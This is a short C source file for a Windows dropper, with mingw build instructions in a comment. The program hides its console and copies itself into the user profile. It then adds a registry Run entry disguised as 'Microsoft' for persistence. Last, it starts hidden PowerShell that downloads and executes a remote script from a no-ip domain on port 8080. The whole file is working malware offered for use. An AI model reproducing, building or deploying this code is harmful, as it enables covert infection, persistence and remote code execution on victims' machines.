#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <aclapi.h>
#include <shlobj.h>
#include <windows.h>
#include <unistd.h>
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")
/*
# No Windows
# Donwload gcc-4.9-win32 in http://sourceforge.net/projects/mingw-w64/files/latest/download
$ gcc web_deliveryBuild.c -o web_deliveryBuild.exe -lws2_32
# No Linux 
$ apt-get install mingw32
$ i586-mingw32msvc-gcc web_deliveryBuild.c -o web_deliveryBuild.exe -lws2_32
*/

int main(int argc, char *argv[]) {
FreeConsole();
char*homedrive=getenv("USERPROFILE");
char destiny[9999];
strcpy(destiny,homedrive);
strcat(destiny,"\\hosY.exe");
CopyFile(argv[0],destiny,0);
HKEY entry;
RegOpenKey(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",&entry); 
RegSetValueEx(entry,"Microsoft",0,1,(LPBYTE)destiny,25); 
RegCloseKey(entry);
Sleep(20);
ShellExecute(NULL,NULL, "powershell.exe", "-nop -w hidden -c $R=new-object net.webclient;$R.proxy=[Net.WebRequest]::GetSystemWebProxy();$R.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $R.downloadstring('http://labx.no-ip.org:8080/');",NULL,SW_HIDE);
exit(0);
}
